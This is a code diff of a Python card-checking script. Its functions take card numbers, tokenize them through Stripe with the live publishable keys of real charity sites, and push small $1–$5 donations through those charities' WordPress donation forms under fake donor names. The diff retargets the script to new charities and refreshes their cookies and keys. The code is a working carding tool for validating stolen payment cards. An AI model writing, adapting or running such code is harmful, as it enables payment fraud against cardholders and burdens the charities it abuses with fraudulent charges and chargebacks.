+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
         }
-        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&referrer=https%3A%2F%2Fapeacewithin.org&time_on_page=18663&client_attribution_metadata[client_session_id]=67d742f1-308b-4ff3-b021-41e7b7eedb56&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SLtAyCCN2Lu09IK5wAiYqjCXgQOozIV5lqweW3r1Bs5ucosj0kuXTJ7nC5S2Xc5CT4xYuObLLxCnXJsWHCAQPLk00cGAmbonk'
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Ftheartsft.com&time_on_page=44823&client_attribution_metadata[client_session_id]=7d8add04-7cef-4827-a98d-78253689bee5&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51O5jsODxXWlmbYpJcJA6yY3XBycCGCyuPLbzxDiTCm49ZhGlteMhnAmygFVIYR8livzHYuNpP2T0vB5psyagkgvh00ZTtzODqP'
+        
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
         pm = res_json.get('id')
@@ -2094,66 +2097,41 @@ def go10(cc_input: str) -> str:
                 
         #3
         cookies = {
-    'charitable_session': '4a420c50ecead7a11aee42561fb52b2c||86400||82800',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-12-13%2019%3A33%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fapeacewithin.org%2Fdonation-page%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2025-12-13%2019%3A33%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fapeacewithin.org%2Fdonation-page%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapeacewithin.org%2Fdonation-page%2F',
-    '__stripe_mid': 'be2e0343-8909-43cd-ba4f-3753d6408c39523a89',
-    '__stripe_sid': 'fe58d9de-bdd2-49ab-bad8-2a3187d6873e8f8cf8',
+            '__cf_bm': '7iI7.iWjdTMMtIArHGuZOyIjBmbmx2TUy6ngNHGdRhw-1767344735-1.0.1.1-HWd4FDmheP.rFdhAvTHsr5kyKf9GHcd.rpj.tXJVQycvyQaE8jdwZav.kAQs2jx21RPs1AqSWO0_wd91i8uqwjpQ4OyySBjiD8Fyx.52x4c',
+            'charitable_session': 'd565ce4949496e29c19daeaa6f751032||86400||82800',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_first_add': 'fd%3D2026-01-02%2009%3A05%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
+            'wpcf7_guest_user_id': 'bc738531-4b4a-44b9-b71d-a93f52ccada5',
+            'sbjs_current_add': 'fd%3D2026-01-02%2009%3A06%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F',
+            '__stripe_mid': 'e948732a-8f73-4e82-b88c-49159b72d4d5045318',
+            '__stripe_sid': '3290d331-bc48-4c45-a647-204d297bfbc7e57c32',
         }
+        
         headers = {
-    'authority': 'apeacewithin.org',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://apeacewithin.org',
-    'pragma': 'no-cache',
-    'referer': 'https://apeacewithin.org/donation-page/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
+            'authority': 'theartsft.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': '__cf_bm=7iI7.iWjdTMMtIArHGuZOyIjBmbmx2TUy6ngNHGdRhw-1767344735-1.0.1.1-HWd4FDmheP.rFdhAvTHsr5kyKf9GHcd.rpj.tXJVQycvyQaE8jdwZav.kAQs2jx21RPs1AqSWO0_wd91i8uqwjpQ4OyySBjiD8Fyx.52x4c; charitable_session=d565ce4949496e29c19daeaa6f751032||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2026-01-02%2009%3A05%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; wpcf7_guest_user_id=bc738531-4b4a-44b9-b71d-a93f52ccada5; sbjs_current_add=fd%3D2026-01-02%2009%3A06%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F; __stripe_mid=e948732a-8f73-4e82-b88c-49159b72d4d5045318; __stripe_sid=3290d331-bc48-4c45-a647-204d297bfbc7e57c32',
+            'origin': 'https://theartsft.com',
+            'referer': 'https://theartsft.com/campaigns/help-us-make-a-difference-right-now/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
-        data = {
-    'charitable_form_id': f'{form_id}',
-    f'{form_id}': '',
-    '_charitable_donation_nonce': f'{donation_nonce}',
-    '_wp_http_referer': '/donation-page/',
-    'campaign_id': f'{campaign_id}',
-    'description': 'Help Families Find Peace',
-    'ID': f'{donation_id}',
-    'gateway': 'stripe',
-    'donation_amount': 'custom',
-    'custom_donation_amount': '5.00',
-    'first_name': 'Tiana',
-    'last_name': 'Jakubowski',
-    'email': email,
-    'address': '24 George Street',
-    'address_2': '',
-    'city': 'Racie',
-    'state': 'New South Walet',
-    'postcode': '2000',
-    'country': 'AU',
-    'phone': '+61290123456',
-    'stripe_payment_method': f'{pm}',
-    'action': 'make_donation',
-    'form_action': 'make_donation',
-        }
-        response = requests.post(
-    'https://apeacewithin.org/wp-admin/admin-ajax.php',
-    cookies=cookies,
-    headers=headers,
-    data=data,#, proxies=proxy, timeout=30)    
-        )
+        
+        data = f'charitable_form_id={form_id}&{form_id}=&_charitable_donation_nonce={donation_nonce}&_wp_http_referer=%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F&campaign_id={campaign_id}&description=Your+GIFT+Makes+A+DIFFERENCE!&ID={donation_id}&gateway=stripe&donation_amount=custom&custom_donation_amount=1.00&first_name=Gen&last_name=Paypal&email={email}&address=&address_2=&city=&state=&postcode=&country=US&phone=&stripe_payment_method={pm}&action=make_donation&form_action=make_donation'
+        
+        response = requests.post('https://theartsft.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -2190,7 +2168,7 @@ def go10(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51SLtAyCCN2Lu09IK5wAiYqjCXgQOozIV5lqweW3r1Bs5ucosj0kuXTJ7nC5S2Xc5CT4xYuObLLxCnXJsWHCAQPLk00cGAmbonk',
+    'key': 'pk_live_51O5jsODxXWlmbYpJcJA6yY3XBycCGCyuPLbzxDiTCm49ZhGlteMhnAmygFVIYR8livzHYuNpP2T0vB5psyagkgvh00ZTtzODqP',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -2628,7 +2606,7 @@ def go13(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://ccfoundationorg.com/donate/', headers=headers)
+        response = requests.get('https://gods-dna.com/campaigns/save-water-initiative/donate/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -2640,23 +2618,23 @@ def go13(cc_input: str) -> str:
         	
         #2
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'pragma': 'no-cache',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': user,
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
         }
-        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&referrer=https%3A%2F%2Fccfoundationorg.com&time_on_page=18639&client_attribution_metadata[client_session_id]=54f4b99f-0247-4e79-b555-e8666262b8a7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp'
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fgods-dna.com&time_on_page=28471&client_attribution_metadata[client_session_id]=514a366d-9ca6-4a33-928c-85702c430cbb&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT'
+        
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
         pm = res_json.get('id')
@@ -2667,64 +2645,67 @@ def go13(cc_input: str) -> str:
                 
         #3
         cookies = {
-    'charitable_session': '75cf8a85edd3c55a8dd442a1cad03276||86400||82800',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-12-23%2019%3A04%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2025-12-23%2019%3A04%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F',
-    '__stripe_mid': '25bc75bb-3f89-4b45-8cd4-aee852bb48b1932887',
-    '__stripe_sid': 'eb7897e6-7ec3-4d3f-aa2c-3c2a45a05c36996829',
+            'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
+            'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
+            'tk_ai': 'HVibdSc+HF3H/QFkrPiTYiXR',
+            '__stripe_mid': '28300acb-8ef7-4687-b261-61418c999a5bad3f06',
+            'charitable_session': '32f77a502efa2eb8a91d97ca3835b81c||86400||82800',
+            'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
+            '__stripe_sid': 'e45f54e9-5563-4c55-b832-2b650928c4a333fad8',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_first_add': 'fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
+            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F',
         }
+        
         headers = {
-    'authority': 'ccfoundationorg.com',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    # 'cookie': 'charitable_session=75cf8a85edd3c55a8dd442a1cad03276||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-23%2019%3A04%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-23%2019%3A04%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F; __stripe_mid=25bc75bb-3f89-4b45-8cd4-aee852bb48b1932887; __stripe_sid=eb7897e6-7ec3-4d3f-aa2c-3c2a45a05c36996829',
-    'origin': 'https://ccfoundationorg.com',
-    'pragma': 'no-cache',
-    'referer': 'https://ccfoundationorg.com/donate/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
+            'authority': 'gods-dna.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': 'tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; tk_ai=HVibdSc+HF3H/QFkrPiTYiXR; __stripe_mid=28300acb-8ef7-4687-b261-61418c999a5bad3f06; charitable_session=32f77a502efa2eb8a91d97ca3835b81c||86400||82800; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; __stripe_sid=e45f54e9-5563-4c55-b832-2b650928c4a333fad8; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F',
+            'origin': 'https://gods-dna.com',
+            'referer': 'https://gods-dna.com/campaigns/save-water-initiative/donate/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
+        
         data = {
-    'charitable_form_id': f'{form_id}',
-    f'{form_id}': '',
-    '_charitable_donation_nonce': f'{donation_nonce}',
-    '_wp_http_referer': '/donate/',
-    'campaign_id': f'{campaign_id}',
-    'description': 'CC Foundation Donation Form',
-    'ID': f'{donation_id}',
-    'donation_amount': 'custom',
-    'custom_donation_amount': '1.00',
-    'recurring_donation': 'once',
-    'title': 'Mr',
-    'first_name': 'Tiana',
-    'last_name': 'Jakubowski',
-    'email': email,
-    'address': '24 George Street',
-    'postcode': '2000',
-    'gateway': 'stripe',
-    'stripe_payment_method': f'{pm}',
-    'action': 'make_donation',
-    'form_action': 'make_donation',
+            'charitable_form_id': f'{form_id}',
+            f'{form_id}': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/campaigns/save-water-initiative/donate/',
+            'campaign_id': f'{campaign_id}',
+            'description': 'Sierra Leone, West Africa Project',
+            'ID': f'{donation_id}',
+            'gateway': 'stripe',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'address': '',
+            'address_2': '',
+            'city': '',
+            'state': '',
+            'postcode': '',
+            'country': 'US',
+            'phone': '',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
         }
-        response = requests.post(
-    'https://ccfoundationorg.com/wp-admin/admin-ajax.php',
-    cookies=cookies,
-    headers=headers,
-    data=data,#, proxies=proxy, timeout=30)    
-        )
+        
+        response = requests.post('https://gods-dna.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -2761,7 +2742,7 @@ def go13(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51igkkvagdyehlubfnxi5en0wc8t5q7yydojzfj3wgc93b2maxq0rvwwodbdgil7enl3lbx27n74ttqelkvqk5fhe00ruuiy5lp',
+    'key': 'pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -2822,7 +2803,7 @@ def go14(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://arkfamilycenter.org/donate/', headers=headers)
+        response = requests.get('https://run4yitzi.com/campaigns/izabennaroch/donate/', headers=headers)
